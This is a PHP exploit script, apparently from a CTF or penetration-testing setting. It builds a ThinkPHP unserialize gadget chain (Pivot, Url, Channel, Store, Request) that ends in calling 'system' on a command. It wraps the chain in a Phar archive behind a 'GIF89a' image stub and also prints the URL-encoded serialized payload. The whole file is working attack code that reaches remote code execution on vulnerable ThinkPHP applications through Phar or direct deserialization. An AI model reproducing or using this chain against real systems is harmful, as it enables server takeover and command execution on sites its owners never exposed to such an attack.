<?php

namespace think {
    abstract class Model
    {
        private $lazySave = true;
        private $data = ['a' => 'b'];
        private $exists = true;
        protected $withEvent = false;
        protected $readonly = ['a'];
        protected $relationWrite;
        private $relation;
        private $origin = [];

        public function __construct($value)
        {
            $this->relation = ['r' => $this];
            $this->origin = ["n" => $value];
            $this->relationWrite = ['r' => ["n" => $value]];
        }
    }

    class App
    {
        protected $request;
    }

    class Request
    {
        protected $mergeParam = true;
        protected $param = ["ipconfig"];
        protected $filter = "system";
    }
}

namespace think\model {
    use think\Model;

    class Pivot extends Model
    {
    }
}

namespace think\route {
    use think\App;

    class Url
    {
        protected $url = "";
        protected $domain = "domain";
        protected $route;
        protected $app;

        public function __construct($route)
        {
            $this->route = $route;
            $this->app = new App();
        }
    }
}

namespace think\log {
    class Channel
    {
        protected $lazy = false;
        protected $logger;
        protected $log = [];

        public function __construct($logger)
        {
            $this->logger = $logger;
        }
    }
}

namespace think\session {
    class Store
    {
        protected $data;
        protected $serialize = ["call_user_func"];
        protected $id = "";

        public function __construct($data)
        {
            $this->data = [$data, "param"];
        }
    }
}

namespace {
    use think\Request;
    use think\session\Store;
    use think\log\Channel;
    use think\route\Url;
    use think\model\Pivot;

    // 创建 Phar 对象
    $phar = new Phar("app.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");

    // 实例化对象
    $request = new Request();
    $store = new Store($request);
    $channel = new Channel($store);
    $url = new Url($channel);
    $model = new Pivot($url);

    // 将模型对象序列化并存入 Phar 的元数据
    $phar->setMetadata($model);
    $phar->addFromString("test.txt", "test content"); // 添加文件
    $phar->stopBuffering();

    // 输出序列化后的模型
    echo urlencode(serialize($model));
}
